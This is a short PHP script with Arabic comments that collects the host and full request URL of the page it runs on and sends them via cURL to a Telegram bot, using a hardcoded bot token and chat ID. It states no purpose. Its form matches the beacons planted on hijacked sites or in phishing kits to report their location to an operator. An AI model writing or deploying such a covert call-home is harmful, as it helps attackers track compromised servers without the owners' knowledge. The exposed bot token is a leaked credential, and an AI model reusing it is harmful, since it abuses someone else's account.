<?php
// معلومات البوت ومعرف الدردشة
$token = '6380567136:AAHwFd8VyK2u49kuoA2ZhhnHfy_59CnHd_E';
$chat_id = '2057593901';

// جمع معلومات الموقع
$host_name = $_SERVER['HTTP_HOST'];
$url = "https://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];

$message .= "URL: " . $url;

// إجراء الطلب باستخدام cURL
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chat_id . "&text=" . urlencode($message));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result = curl_exec($ch);
curl_close($ch);
?>
